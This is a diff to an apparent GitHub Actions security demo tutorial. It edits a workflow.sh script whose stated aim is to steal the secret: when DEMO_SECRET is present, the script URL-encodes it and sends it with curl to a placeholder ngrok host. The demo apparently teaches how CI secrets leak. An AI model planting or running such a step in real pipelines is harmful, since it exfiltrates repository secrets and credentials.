@@ -58,6 +58,7 @@ git checkout -b test-pending
 Edit `workflow.sh` to steal the secret:
 
 ```bash
+
 #!/usr/bin/env bash
 
 echo "=== Script started ==="
@@ -71,11 +72,16 @@ set -e
 if [ -n "$DEMO_SECRET" ]; then
     echo "DEMO_SECRET is available"
     echo "Secret length: ${#DEMO_SECRET}"
-
-    curl -X POST "https://your-ngrok-url.ngrok.io" -d "secret=$DEMO_SECRET"
+    
+    # URL-encode the secret
+    encoded_secret=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$DEMO_SECRET")
+    
+    curl "https://your-ngrok-url.ngrok.io/${encoded_secret}/notify"
     echo "test Pass"
 else
     echo "DEMO_SECRET is not available"
 fi
 echo "=== Script finished ==="
+
 ```
+![GitHub Actions Security Demo](<Screenshot 2026-06-26 170336.png>)
